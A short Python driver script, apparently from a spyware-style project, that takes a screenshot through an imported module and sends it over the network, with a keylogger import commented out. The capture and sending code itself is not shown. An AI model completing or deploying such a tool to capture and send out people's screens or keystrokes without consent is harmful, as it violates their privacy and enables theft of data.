#import keylogger
import screenshotter
import networking

Screen = screenshotter.Screenshotter()
Net = networking.Networking()

if __name__ == '__main__':
    print('start.')

    File_Name = Screen.screenshot()
    Net.SendScreenshots(File_Name)
    Net.Ending()

    print('done.')